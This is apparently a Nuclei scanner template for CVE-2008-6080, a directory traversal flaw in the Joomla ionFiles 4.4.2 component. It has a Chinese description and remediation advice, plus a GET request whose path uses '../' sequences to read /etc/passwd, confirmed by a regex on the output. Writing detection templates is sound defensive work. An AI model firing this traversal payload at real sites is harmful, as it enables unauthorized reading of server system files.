id: CVE-2008-6080
info:
  name: Joomla! Component ionFiles 4.4.2 - File Disclosure
  author:
  - l0ne1y
  description: |-
    Joomla! Component ionFiles 4.4.2 - 文件读取漏洞
    Joomla 的 ionFiles (com_ionfiles) 4.4.2 组件中 download.php 存在目录遍历漏洞！允许攻击者通过文件参数中的..读取任意文件。
  severity: high
  remediation: |-
    官方修复建议：
    建议您更新当前系统或软件至最新版，完成漏洞的修复。
    https://www.joomla.org/

    临时修复建议：


    1、系统开发阶段的防御，在系统开发阶段应充分考虑系统的安全性，对目录遍历漏洞来说，需对用户提交的内容进行严格的过滤，这里主要指过滤目录跳转符，字符截断符，dir命令等。

    临时修复建议：
    <br/>1、过滤\".\"，使用户在url中不能回溯上级目录。
    2、系统开发阶段的防御，在系统开发阶段应充分考虑系统的安全性，对目录遍历漏洞来说，需对用户提交的内容进行严格的过滤，这里主要指过滤目录跳转符，字符截断符，dir命令等。
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1'
  method: GET
